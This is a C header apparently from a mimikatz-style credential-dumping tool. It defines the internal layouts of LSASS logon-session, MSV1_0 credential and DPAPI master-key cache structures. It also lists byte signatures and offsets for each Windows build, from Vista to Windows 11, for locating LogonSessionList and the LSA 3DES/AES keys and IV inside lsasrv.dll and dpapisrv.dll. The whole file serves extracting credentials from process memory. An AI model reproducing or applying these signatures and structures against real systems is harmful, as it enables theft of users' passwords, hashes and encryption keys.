#pragma once
#include "glob.h"

typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[ANYSIZE_ARRAY]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;
typedef struct _KIWI_BCRYPT_KEY {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG bits;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, * PKIWI_BCRYPT_KEY;
typedef struct _KIWI_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PKIWI_BCRYPT_KEY key;
	PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;

typedef struct _KIWI_BCRYPT_KEY8 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	PVOID unk4;	// before, align in x64
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY8, * PKIWI_BCRYPT_KEY8;
typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;

typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
	SIZE_T tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, * PKUHL_M_SEKURLSA_ENUM_HELPER;
typedef LONG KPRIORITY;
typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS* PVM_COUNTERS;
typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
typedef enum _KWAIT_REASON {
	Executive,
	FreePage,
	PageIn,
	PoolAllocation,
	DelayExecution,
	Suspended,
	UserRequest,
	WrExecutive,
	WrFreePage,
	WrPageIn,
	WrPoolAllocation,
	WrDelayExecution,
	WrSuspended,
	WrUserRequest,
	WrEventPair,
	WrQueue,
	WrLpcReceive,
	WrLpcReply,
	WrVirtualMemory,
	WrPageOut,
	WrRendezvous,
	WrKeyedEvent,
	WrTerminated,
	WrProcessInSwap,
	WrCpuRateControl,
	WrCalloutStack,
	WrKernel,
	WrResource,
	WrPushLock,
	WrMutex,
	WrQuantumEnd,
	WrDispatchInt,
	WrPreempted,
	WrYieldExecution,
	WrFastMutex,
	WrGuardedMutex,
	WrRundown,
	MaximumWaitReason
} KWAIT_REASON;
typedef struct _SYSTEM_THREAD {
#if !defined(_M_X64) || !defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER KernelTime;
#endif
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitchCount;
	ULONG State;
	KWAIT_REASON WaitReason;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER unk;
#endif
} SYSTEM_THREAD, * PSYSTEM_THREAD;
typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE ParentProcessId;
	ULONG HandleCount;
	LPCWSTR Reserved2[2];
	ULONG PrivatePageCount;
	VM_COUNTERS VirtualMemoryCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD Threads[ANYSIZE_ARRAY];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
typedef struct _KIWI_BCRYPT_GEN_KEY {
	BCRYPT_ALG_HANDLE hProvider;
	BCRYPT_KEY_HANDLE hKey;
	PBYTE pKey;
	ULONG cbKey;
} KIWI_BCRYPT_GEN_KEY, * PKIWI_BCRYPT_GEN_KEY;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModulevector;
	LIST_ENTRY InMemoryOrderModulevector;
	LIST_ENTRY InInitializationOrderModulevector;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	struct BitField {
		BYTE ImageUsesLargePages : 1;
		BYTE SpareBits : 7;
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	/// ...
} PEB, * PPEB;

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
typedef struct _LSA_UNICODE_STRING_F32 {
	USHORT Length;
	USHORT MaximumLength;
	DWORD  Buffer;
} LSA_UNICODE_STRING_F32, * PLSA_UNICODE_STRING_F32;

typedef LSA_UNICODE_STRING_F32 UNICODE_STRING_F32, * PUNICODE_STRING_F32;

typedef struct _LDR_DATA_TABLE_ENTRY_F32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderLinks;
	LIST_ENTRY32 InInitializationOrderLinks;
	DWORD DllBase;
	DWORD EntryPoint;
	DWORD SizeOfImage;
	UNICODE_STRING_F32 FullDllName;
	UNICODE_STRING_F32 BaseDllName;
	/// ...
} LDR_DATA_TABLE_ENTRY_F32, * PLDR_DATA_TABLE_ENTRY_F32;

typedef struct _PEB_LDR_DATA_F32 {
	ULONG Length;
	BOOLEAN Initialized;
	DWORD SsHandle;
	LIST_ENTRY32 InLoadOrderModulevector;
	LIST_ENTRY32 InMemoryOrderModulevector;
	LIST_ENTRY32 InInitializationOrderModulevector;
} PEB_LDR_DATA_F32, * PPEB_LDR_DATA_F32;

typedef struct _PEB_F32 {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	struct BitField_F32 {
		BYTE ImageUsesLargePages : 1;
		BYTE SpareBits : 7;
	};
	DWORD Mutant;
	DWORD ImageBaseAddress;
	DWORD Ldr;
	/// ...
} PEB_F32, * PPEB_F32;
#endif
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	/// ...
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;
typedef STRING ANSI_STRING;
typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
	struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS* next;
	ANSI_STRING Primary;
	LSA_UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, * PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
typedef struct _KIWI_MSV1_0_CREDENTIALS {
	struct _KIWI_MSV1_0_CREDENTIALS* next;
	DWORD AuthenticationPackageId;
	PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, * PKIWI_MSV1_0_CREDENTIALS;
typedef struct _KIWI_MSV1_0_LIST_60 {
	struct _KIWI_MSV1_0_LIST_6* Flink;
	struct _KIWI_MSV1_0_LIST_6* Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
	ULONG unk23;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_60, * PKIWI_MSV1_0_LIST_60;
typedef struct _KIWI_MSV1_0_LIST_61 {
	struct _KIWI_MSV1_0_LIST_6* Flink;
	struct _KIWI_MSV1_0_LIST_6* Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_61, * PKIWI_MSV1_0_LIST_61;
typedef struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ {
	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ* Flink;
	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ* Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align) <===================
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, * PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ;

typedef struct _KIWI_MSV1_0_LIST_62 {
	struct _KIWI_MSV1_0_LIST_62* Flink;
	struct _KIWI_MSV1_0_LIST_62* Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_62, * PKIWI_MSV1_0_LIST_62;

typedef struct _KIWI_MSV1_0_LIST_63 {
	struct _KIWI_MSV1_0_LIST_63* Flink;	//off_2C5718
	struct _KIWI_MSV1_0_LIST_63* Blink; //off_277380
	PVOID unk0; // unk_2C0AC8
	ULONG unk1; // 0FFFFFFFFh
	PVOID unk2; // 0
	ULONG unk3; // 0
	ULONG unk4; // 0
	ULONG unk5; // 0A0007D0h
	HANDLE hSemaphore6; // 0F9Ch
	PVOID unk7; // 0
	HANDLE hSemaphore8; // 0FB8h
	PVOID unk9; // 0
	PVOID unk10; // 0
	ULONG unk11; // 0
	ULONG unk12; // 0 
	PVOID unk13; // unk_2C0A28
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align)
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

typedef struct _KIWI_MASTERKEY_CACHE_ENTRY {
	struct _KIWI_MATERKEY_CACHE_ENTRY* Flink;
	struct _KIWI_MATERKEY_CACHE_ENTRY* Blink;
	LUID LogonId;
	GUID KeyUid;
	FILETIME insertTime;
	ULONG keySize;
	BYTE  key[ANYSIZE_ARRAY];
} KIWI_MASTERKEY_CACHE_ENTRY, * PKIWI_MASTERKEY_CACHE_ENTRY;
typedef struct _DLL_INFORMATION
{
	PWSTR dllName;
	PVOID ImageBase;
	DWORD dwSizeOfImage;
	DWORD TimeDateStamp;
}DLL_INFORMATION, * PDLL_INFORMATION;

typedef struct _KULL_M_PATCH_PATTERN {
	DWORD Length;
	BYTE* Pattern;
} KULL_M_PATCH_PATTERN, * PKULL_M_PATCH_PATTERN;
typedef struct _KULL_M_PATCH_OFFSETS {
	LONG off0;
#if defined(_M_ARM64)
	LONG armOff0;
#endif
	LONG off1;
#if defined(_M_ARM64)
	LONG armOff1;
#endif
	LONG off2;
#if defined(_M_ARM64)
	LONG armOff2;
#endif
	LONG off3;
#if defined(_M_ARM64)
	LONG armOff3;
#endif
	LONG off4;
#if defined(_M_ARM64)
	LONG armOff4;
#endif
	LONG off5;
#if defined(_M_ARM64)
	LONG armOff5;
#endif
	LONG off6;
#if defined(_M_ARM64)
	LONG armOff6;
#endif
	LONG off7;
#if defined(_M_ARM64)
	LONG armOff7;
#endif
	LONG off8;
#if defined(_M_ARM64)
	LONG armOff8;
#endif
	LONG off9;
#if defined(_M_ARM64)
	LONG armOff9;
#endif
} KULL_M_PATCH_OFFSETS, * PKULL_M_PATCH_OFFSETS;
typedef struct _KULL_M_PATCH_GENERIC {
	DWORD MinBuildNumber;
	KULL_M_PATCH_PATTERN Search;
	KULL_M_PATCH_PATTERN Patch;
	KULL_M_PATCH_OFFSETS Offsets;
} KULL_M_PATCH_GENERIC, * PKULL_M_PATCH_GENERIC;


BYTE PTRN_WN60_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
BYTE PTRN_WN61_LogonSessionList[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
BYTE PTRN_WN63_LogonSessionList[] = { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
BYTE PTRN_WN6x_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
BYTE PTRN_WN1703_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN1803_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN11_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {

	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_MIN_BUILD_11,	{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
};
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
};

BYTE PTRN_WI60_MasterKeyCacheList[] = { 0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84 };
BYTE PTRN_WI61_MasterKeyCacheList[] = { 0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05 }; // InitializeKeyCache to avoid  version change
BYTE PTRN_WI62_MasterKeyCacheList[] = { 0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85 };
BYTE PTRN_WI63_MasterKeyCacheList[] = { 0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85 };
BYTE PTRN_WI64_MasterKeyCacheList[] = { 0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08 };
BYTE PTRN_WI64_1607_MasterKeyCacheList[] = { 0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08 };

KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {

	{ KULL_M_WIN_BUILD_VISTA,{ sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList },{ 0, NULL },{ -4 } },
	{ KULL_M_WIN_BUILD_7,{ sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList },{ 0, NULL },{ 7 } },
	{ KULL_M_WIN_BUILD_8,{ sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList },{ 0, NULL },{ -4 } },
	{ KULL_M_WIN_BUILD_BLUE,{ sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList },{ 0, NULL },{ -10 } },
	{ KULL_M_WIN_BUILD_10_1507,{ sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList },{ 0, NULL },{ -7 } },
	{ KULL_M_WIN_BUILD_10_1607,{ sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList },{ 0, NULL },{ 11 } },
};

DLL_INFORMATION dllInfo[] =
{
	{ L"lsasrv.dll", NULL, 0 },
	{ L"dpapisrv.dll", NULL, 0 }
};
KIWI_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16] = { 0 };
PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;
DWORD dwMajor, dwMinor, dwBuildNumber;